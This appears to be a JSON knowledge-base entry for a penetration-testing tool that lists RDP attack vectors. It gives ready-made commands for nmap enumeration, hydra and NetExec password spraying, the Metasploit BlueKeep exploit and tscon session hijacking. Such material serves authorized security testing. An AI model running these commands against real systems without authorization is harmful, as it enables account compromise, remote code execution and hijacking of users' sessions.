{
  "service": "RDP",
  "description": "Remote Desktop Protocol for Windows remote access",
  "ports": [3389],
  "serviceNames": ["rdp", "ms-wbt-server"],
  "targetOs": ["Windows"],
  "vectors": [
    {
      "id": "rdp_enumeration",
      "name": "RDP Service Enumeration",
      "phase": "reconnaissance",
      "prerequisites": [],
      "description": "Enumerate RDP service details",
      "commands": [
        {
          "tool": "nmap",
          "syntax": "nmap -p 3389 --script rdp-enum-encryption,rdp-ntlm-info <target>",
          "description": "RDP enumeration with NSE scripts"
        }
      ],
      "outcomes": ["rdp_version", "encryption_level"]
    },
    {
      "id": "rdp_password_spray",
      "name": "RDP Password Spraying",
      "phase": "credential_access",
      "prerequisites": ["username"],
      "description": "Spray passwords against RDP",
      "commands": [
        {
          "tool": "hydra",
          "syntax": "hydra -l <user> -P <password_list> rdp://<target>",
          "description": "RDP password bruteforce"
        },
        {
          "tool": "nxc",
          "syntax": "nxc rdp <target> -u <user> -p <password_list>",
          "description": "NetExec RDP bruteforce"
        }
      ],
      "outcomes": ["valid_credentials", "rdp_access"]
    },
    {
      "id": "rdp_bluekeep",
      "name": "BlueKeep (CVE-2019-0708)",
      "phase": "exploitation",
      "prerequisites": ["vulnerable_host"],
      "description": "Exploit RDP vulnerability for RCE",
      "commands": [
        {
          "tool": "metasploit",
          "syntax": "use exploit/windows/rdp/cve_2019_0708_bluekeep_rce",
          "description": "Metasploit BlueKeep exploit"
        }
      ],
      "outcomes": ["shell", "system_access"]
    },
    {
      "id": "rdp_session_hijack",
      "name": "RDP Session Hijacking",
      "phase": "privilege_escalation",
      "prerequisites": ["system_access"],
      "description": "Hijack active RDP sessions",
      "commands": [
        {
          "tool": "tscon",
          "syntax": "tscon <session_id> /dest:<current_session>",
          "description": "Connect to another user's session"
        },
        {
          "tool": "query",
          "syntax": "query user",
          "description": "List active RDP sessions"
        }
      ],
      "outcomes": ["session_hijack", "privilege_escalation"]
    }
  ]
}
